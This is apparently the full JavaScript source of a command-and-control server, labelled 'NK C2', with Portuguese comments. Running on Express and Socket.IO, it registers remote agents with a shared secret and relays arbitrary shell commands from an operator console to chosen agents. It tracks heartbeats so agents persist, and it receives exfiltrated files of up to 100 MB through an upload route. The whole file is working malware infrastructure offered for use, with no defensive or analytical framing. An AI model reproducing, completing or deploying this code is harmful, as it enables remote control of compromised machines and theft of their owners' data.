
// --- NK C2 SERVER (REAL TIME + PERSISTENT + EXFIL) ---
// UPDATED: 2025-12-03T20:55:24.989Z
const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');
const cors = require('cors');
const fs = require('fs'); // Para exfiltração de arquivos
const multer = require('multer'); // Para upload de arquivos

const app = express();
const server = http.createServer(app);

// Increase buffer size for large file downloads (Exfiltration)
const io = new Server(server, { 
    cors: { origin: "*" },
    maxHttpBufferSize: 1e8 // 100 MB Limit
});

app.use(cors());
app.use(express.static(path.join(__dirname, 'public')));

// --- CONFIGURAÇÕES DE SEGURANÇA E EXFILTRAÇÃO ---
const AGENT_SHARED_SECRET = process.env.AGENT_SECRET || 'nk'; // Use uma chave forte!
const CONSOLE_API_KEY = process.env.CONSOLE_API_KEY || 'consolenk'; // Para autenticar a UI
const UPLOADS_DIR = path.join(__dirname, 'uploads');

// Garante que o diretório de uploads exista
if (!fs.existsSync(UPLOADS_DIR)) {
    fs.mkdirSync(UPLOADS_DIR, { recursive: true });
}

// Configuração do Multer para upload de arquivos
const storage = multer.diskStorage({
    destination: function (req, file, cb) {
        const agentId = req.params.agentId;
        const agentUploadDir = path.join(UPLOADS_DIR, agentId);
        if (!fs.existsSync(agentUploadDir)) {
            fs.mkdirSync(agentUploadDir, { recursive: true });
        }
        cb(null, agentUploadDir);
    },
    filename: function (req, file, cb) {
        cb(null, Date.now() + '-' + file.originalname); // Adiciona timestamp para evitar colisões
    }
});
const upload = multer({ storage: storage });

// --- MAPAS DE ESTADO ---
let agents = new Map(); // socket.id -> { id: agentId, currentDir: '/', lastSeen: Date }
let agentSocketMap = new Map(); // agentId -> socket.id
let consoleSockets = new Map(); // socket.id -> true (para consoles autenticadas)

// --- ROTAS HTTP PARA EXFILTRAÇÃO ---
app.post('/upload/:agentId', upload.single('file'), (req, res) => {
    const agentId = req.params.agentId;
    if (!agents.has(agentSocketMap.get(agentId))) { // Verifica se o agente está online e autenticado
        return res.status(401).send('Unauthorized agent or agent offline.');
    }

    if (!req.file) {
        return res.status(400).send('No file uploaded.');
    }
    console.log(`[EXFIL] File uploaded from ${agentId}: ${req.file.path}`);
    io.emit('log', `[EXFIL] File uploaded from ${agentId}: ${req.file.originalname} to ${req.file.path}`);
    res.status(200).send('File uploaded successfully.');
});


io.on('connection', (socket) => {
    console.log('[SOCK] New Connection: ' + socket.id);

    // 1. Identificação e Autenticação
    socket.on('identify', ({ type, id, secret, apiKey }) => {
        if (type === 'agent') {
            if (secret === AGENT_SHARED_SECRET) {
                agents.set(socket.id, { id: id, currentDir: '/', lastSeen: new Date() });
                agentSocketMap.set(id, socket.id);
                console.log(`[AGENT] Online: ${id} (Authenticated)`);
                io.emit('log', `[SYSTEM] AGENT CONNECTED: ${id} (Secure Link)`);
            } else {
                console.log(`[AGENT] Unauthorized connection attempt from ${id}. Disconnecting.`);
                socket.emit('log', '[ERROR] Unauthorized agent connection. Disconnecting.');
                socket.disconnect();
            }
        } else if (type === 'console') {
            if (apiKey === CONSOLE_API_KEY) {
                consoleSockets.set(socket.id, true);
                console.log('[CONSOLE] Admin UI Connected (Authenticated)');
                socket.emit('log', '[SYSTEM] Console Connected. Welcome, Commander.');
                // Envia a lista de agentes online para a nova console
                const onlineAgents = Array.from(agents.values()).map(a => ({ id: a.id, currentDir: a.currentDir, lastSeen: a.lastSeen }));
                socket.emit('agents_list', onlineAgents);
            } else {
                console.log('[CONSOLE] Unauthorized console connection attempt. Disconnecting.');
                socket.emit('log', '[ERROR] Unauthorized console connection. Disconnecting.');
                socket.disconnect();
            }
        } else {
            console.log('[SOCK] Unknown connection type. Disconnecting.');
            socket.disconnect();
        }
    });

    // 2. Comandos (UI -> Agent) - AGORA DIRECIONADO!
    socket.on('cmd', (data) => {
        if (!consoleSockets.has(socket.id)) { // Apenas consoles autenticadas podem enviar comandos
            socket.emit('log', '[ERROR] Unauthorized command attempt.');
            return;
        }

        const { targetAgentId, cmd, commandId } = data;
        if (!targetAgentId || !cmd || !commandId) {
            socket.emit('log', '[ERROR] Invalid command format. Missing targetAgentId, cmd, or commandId.');
            return;
        }

        const targetSocketId = agentSocketMap.get(targetAgentId);
        if (targetSocketId && agents.has(targetSocketId)) {
            console.log(`[CMD] Dispatching to ${targetAgentId}: ${cmd} (ID: ${commandId})`);
            io.to(targetSocketId).emit('exec', { cmd, commandId });
            // Mapeia commandId para o socket da console que enviou, para feedback direcionado
            // (Você precisaria de um mapa aqui: commandId -> consoleSocketId)
            // Por simplicidade, vamos retransmitir para todas as consoles por enquanto.
        } else {
            console.log(`[CMD] Agent ${targetAgentId} not found or offline.`);
            socket.emit('log', `[ERROR] Agent ${targetAgentId} not found or offline.`);
        }
    });

    // 3. Logs em Tempo Real (Agent -> UI)
    socket.on('stream_log', (data) => {
        // data = { output: "line of text", from: "agent_id" }
        io.emit('log', data.output); // Retransmite para todas as consoles
    });

    // 4. Feedback de Comando Específico (Agent -> UI)
    socket.on('cmd_result', (data) => {
        // data = { commandId: "uuid", output: "stdout", error: "stderr", returnCode: 0, cwd: "/path", from: "agent_id" }
        console.log(`[RESULT] From ${data.from} (CMD ID: ${data.commandId}): ${data.output.substring(0, 50)}...`);
        io.emit('cmd_result_ui', data); // Retransmite para todas as consoles
        
        // Atualiza o diretório atual do agente
        if (data.cwd && agents.has(agentSocketMap.get(data.from))) {
            agents.get(agentSocketMap.get(data.from)).currentDir = data.cwd;
            io.emit('agent_update', { id: data.from, currentDir: data.cwd }); // Notifica consoles sobre mudança de CWD
        }
    });

    // 5. Heartbeat do Agente (para persistência e status)
    socket.on('heartbeat', ({ id, currentDir }) => {
        if (agents.has(socket.id)) {
            const agent = agents.get(socket.id);
            agent.lastSeen = new Date();
            agent.currentDir = currentDir; // Agente informa seu CWD
            io.emit('agent_update', { id: agent.id, lastSeen: agent.lastSeen, currentDir: agent.currentDir });
        }
    });

    socket.on('disconnect', () => {
        if (agents.has(socket.id)) {
            const agent = agents.get(socket.id);
            io.emit('log', `[SYSTEM] AGENT LOST: ${agent.id}`);
            agents.delete(socket.id);
            agentSocketMap.delete(agent.id);
            io.emit('agent_update', { id: agent.id, status: 'offline' }); // Notifica consoles
        } else if (consoleSockets.has(socket.id)) {
            consoleSockets.delete(socket.id);
            console.log('[CONSOLE] Admin UI Disconnected.');
            io.emit('log', '[SYSTEM] Console Disconnected.');
        }
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`NK C2 Server running on port ${PORT}`));
